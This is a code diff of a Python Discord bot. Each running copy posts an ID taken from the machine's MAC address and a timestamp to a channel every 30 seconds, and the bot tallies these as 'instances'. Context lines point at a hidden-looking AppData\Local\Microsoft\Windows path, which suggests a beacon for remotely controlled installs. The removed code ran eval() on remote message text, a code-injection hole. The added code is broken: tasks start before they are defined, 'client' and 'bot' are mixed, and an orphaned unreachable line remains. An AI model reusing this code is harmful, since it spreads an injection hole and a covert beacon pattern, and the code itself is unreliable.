@@ -104,6 +104,7 @@ def get_device_ip():
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
 INSTANCE_ID = get_device_ip()
+UPDATE_INTERVAL = 30  # seconds
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
@@ -215,65 +216,69 @@ async def on_ready():
                 if channel:
                     await channel.send(embed=embed)
 
-    async def get_instances():
-        """Fetches the instance data from the Discord message."""
-        channel = client.get_channel(CHANNEL_ID)
-        if not channel:
-            print("Channel not found!")
-            return {}
+    send_status.start()  # Start updating instance messages
+    update_activity.start()  # Start updating presence
+    cleanup_old_messages.start()  # Start removing outdated messages
 
-        try:
-            message = await channel.fetch_message(MESSAGE_ID)
-            content = message.content.strip()
-
-            if not content:
-                return {}
-
-            return eval(content)
-        except Exception as e:
-            print(f"Error fetching message: {e}")
-            return {}
-
-    async def update_instances(instances):
-        """Updates the Discord message with the new instance list."""
-        channel = client.get_channel(CHANNEL_ID)
+    @tasks.loop(seconds=UPDATE_INTERVAL)
+    async def send_status():
+        """Sends a UUID message and deletes the previous one."""
+        global last_message
+        channel = bot.get_channel(CHANNEL_ID)
         if not channel:
             print("Channel not found!")
             return
 
         try:
-            message = await channel.fetch_message(MESSAGE_ID)
-            await message.edit(content=str(instances))
+            if last_message:
+                await last_message.delete()  # Delete the old message
+            last_message = await channel.send(f"{INSTANCE_ID} | {int(time.time())}")  # Send new message
         except Exception as e:
-            print(f"Error updating message: {e}")
+            print(f"Error sending status: {e}")
 
-    async def register_instance():
-        instances = await get_instances()
-        instances[INSTANCE_ID] = time.time()
-        await update_instances(instances)
-
-    async def cleanup_stale_instances():
-        instances = await get_instances()
-        current_time = time.time()
-        instances = {key: value for key, value in instances.items() if current_time - value < 90}
-        await update_instances(instances)
-
-    @tasks.loop(seconds=30)
+    @tasks.loop(seconds=UPDATE_INTERVAL)
     async def update_activity():
-        instances = await get_instances()
-        count = len(instances)
-        activity = nextcord.Game(f"Running on {count} instances.")
-        await client.change_presence(activity=activity)
+        """Counts active messages in the channel to update the bot's presence."""
+        channel = bot.get_channel(CHANNEL_ID)
+        if not channel:
+            print("Channel not found!")
+            return
 
-    @tasks.loop(seconds=60)
-    async def cleanup_instances():
-        await cleanup_stale_instances()
+        try:
+            messages = await channel.history(limit=100).flatten()  # Fetch recent messages
+            count = sum(1 for msg in messages if is_message_valid(msg))  # Count valid messages
+            activity = nextcord.Game(f"Running on {count} instances")
+            await bot.change_presence(activity=activity)
+        except Exception as e:
+            print(f"Error updating activity: {e}")
 
-    @client.event
-    async def on_disconnect():
-        instances = await get_instances()
-        instances.pop(INSTANCE_ID, None)
-        await update_instances(instances)
+    @tasks.loop(seconds=UPDATE_INTERVAL)
+    async def cleanup_old_messages():
+        """Deletes messages that are too old."""
+        channel = bot.get_channel(CHANNEL_ID)
+        if not channel:
+            print("Channel not found!")
+            return
+
+        try:
+            messages = await channel.history(limit=100).flatten()
+            for msg in messages:
+                if not is_message_valid(msg):  # If message is outdated, delete it
+                    await msg.delete()
+        except Exception as e:
+            print(f"Error cleaning messages: {e}")
+
+    def is_message_valid(message):
+        """Checks if a message is still valid based on its timestamp."""
+        try:
+            parts = message.content.split(" | ")
+            if len(parts) < 2:
+                return False
+            timestamp = int(parts[1])  # Extract timestamp
+            return time.time() - timestamp < UPDATE_INTERVAL * 1.5  # Allow slight buffer
+        except:
+            return False  # Invalid message format
+            await update_instances(instances)
 
 
 
